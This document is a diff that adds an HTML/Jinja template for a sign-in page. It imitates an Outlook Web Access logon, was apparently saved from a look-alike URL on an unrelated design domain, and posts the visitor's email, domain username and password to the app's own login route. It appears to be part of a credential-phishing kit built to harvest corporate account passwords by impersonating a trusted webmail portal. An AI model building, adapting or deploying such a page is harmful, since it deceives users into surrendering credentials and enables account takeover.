@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<!-- saved from url=(0068)https://mettatrust.wearedesigners.net/owa-auth-logon-aspx/index.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Sign in</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="https://mettatrust.wearedesigners.net/owa-auth-logon-aspx/favicon.ico">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: 'Segoe UI', 'Montserrat', Arial, sans-serif;
+      min-height: 100vh;
+    }
+    body {
+      height: 100vh;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: row;
+    }
+    .left-pane {
+      width: 22%;
+      min-width: 84px;
+      background: #0072c6;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: width 0.24s;
+    }
+    .left-pane .logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .left-pane .logo img {
+      width: 140px;
+      height: auto;
+      margin-bottom: 0;
+    }
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: linear-gradient(to bottom, #fff 80%, #fafbfc 100%);
+      position: relative;
+    }
+    .login-box {
+      width: 370px;
+      max-width: 90vw;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-bottom: 20px;
+
+      /* --- DESIGN CHANGES FOR FLOATING CARD --- */
+      background: #fff;
+      border-radius: 24px;
+      box-shadow: 0 8px 32px 0 rgba(0,120,212,0.13), 
+                  0 1.5px 8px 0 rgba(0,120,212,0.09), 
+                  0 0 0 1.5px #e7f2fc;
+      padding: 38px 32px 30px 32px;
+      margin: 0 auto;
+    }
+    .login-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+    .login-logo img {
+      height: 70px;
+      width: auto;
+      margin-right: 13px;
+    }
+    .login-logo-title {
+      font-size: 46px;
+      color: #0072c6;
+      font-weight: 400;
+      letter-spacing: 1.2px;
+      margin-bottom: 6px;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    .login-box form {
+      width: 90%;
+    }
+    .login-label {
+      display: block;
+      margin-bottom: 5px;
+      color: #222c3d;
+      font-size: 14px;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      font-weight: 400;
+    }
+    .login-input {
+      width: 95%;
+      box-sizing: border-box;
+      font-size: 14px;
+      padding: 8px 6px;
+      margin-bottom: 14px;
+      border: 1px solid #b7b7b7;
+      border-radius: 4px;
+      background: #fff;
+      outline: none;
+      transition: border 0.18s, box-shadow 0.18s;
+      font-family: inherit;
+    }
+    .login-input:focus {
+      border: 1.2px solid #0078d4;
+      background: #f9fafd;
+      box-shadow: 0 0 0 2px #d3e9fa;
+    }
+    /* --- Custom Sign-In Button --- */
+    .sign-in-btn {
+      display: flex;
+      align-items: center;
+      background: none;
+      border: none;
+      color: #0078d4;
+      font-size: 28px;
+      cursor: pointer;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      font-weight: 400;
+      padding: 0;
+      margin: 20px 0 0 0;
+      transition: color 0.13s;
+      gap: 7px;
+    }
+    .sign-in-btn:hover,
+    .sign-in-btn:focus {
+      color: #005499;
+      text-decoration: underline;
+    }
+    .sign-in-svg {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 5px;
+    }
+    .sign-in-svg svg {
+      display: block;
+      width: 28px;
+      height: 28px;
+    }
+    .sign-in-text {
+      font-size: 0.8em;
+      font-weight: 400;
+      color: #0078d4;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      letter-spacing: 0.01em;
+      line-height: 1;
+    }
+    .sign-in-btn:hover .sign-in-text,
+    .sign-in-btn:focus .sign-in-text {
+      color: #005499;
+    }
+    @media (max-width: 700px) {
+      .left-pane {
+        width: 80px;
+        min-width: 50px;
+        padding: 0;
+      }
+      .left-pane .logo img {
+        width: 50px;
+      }
+    }
+    @media (max-width: 400px) {
+      body {
+        flex-direction: column;
+      }
+      .left-pane {
+        width: 60vw;
+        min-width: 0;
+        height: 100px;
+        flex-direction: row;
+        justify-content: flex-start;
+        align-items: center;
+        padding-left: 20px;
+      }
+      .main-content {
+        align-items: flex-start;
+        justify-content: center;
+        height: auto;
+        min-height: calc(100vh - 100px);
+      }
+      .login-box {
+        margin-top: 40px;
+        padding-bottom: 8px;
+        border-radius: 12px;
+        padding-left: 10px;
+        padding-right: 10px;
+      }
+    }
+  </style>
+  <script>
+    function togglePassword() {
+      const passwordField = document.getElementById('password');
+      if (!passwordField) return;
+      const type = passwordField.type === "password" ? "text" : "password";
+      passwordField.type = type;
+    }
+    window.onload = function() {
+      const emailInput = document.getElementById('email');
+      if (emailInput && localStorage.getItem('savedEmail')) {
+        emailInput.value = localStorage.getItem('savedEmail');
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="left-pane">
+    <div class="logo">
+      <img src="{{ url_for('static', filename='image/bgowaas.png')}}" alt="Logo">
+    </div>
+  </div>
+  <div class="main-content">
+    <div class="login-box">
+      <div class="login-logo">
+        <img src="{{ url_for('static', filename='image/fasgfd.png')}}" alt="Logo">
+        <span class="login-logo-title"></span>
+      </div>
+      <form action="{{ url_for('login') }}" method="POST" autocomplete="off">
+        <label class="login-label" for="email">Email Address:</label>
+        <input class="login-input" type="email" id="email" name="email" required="" autocomplete="email">
+
+        <label class="login-label" for="domainuser">Domain\User name:</label>
+        <input class="login-input" type="text" id="domainuser" name="username" required="" autocomplete="username">
+
+        <label class="login-label" for="password">Password:</label>
+        <input class="login-input" type="password" id="password" name="password" required="" autocomplete="current-password">
+
+        <button type="submit" class="sign-in-btn">
+          <span class="sign-in-svg" aria-hidden="true">
+            <svg width="32" height="32" viewBox="0 0 32 32" focusable="false">
+              <circle cx="16" cy="16" r="13" fill="none" stroke="#0078d4" stroke-width="2"></circle>
+              <g>
+                <line x1="11" y1="16" x2="21" y2="16" stroke="#0078d4" stroke-width="2" stroke-linecap="round"></line>
+                <polyline points="17,12 21,16 17,20" fill="none" stroke="#0078d4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
+              </g>
+            </svg>
+          </span>
+          <span class="sign-in-text">sign in</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+
+</body></html>
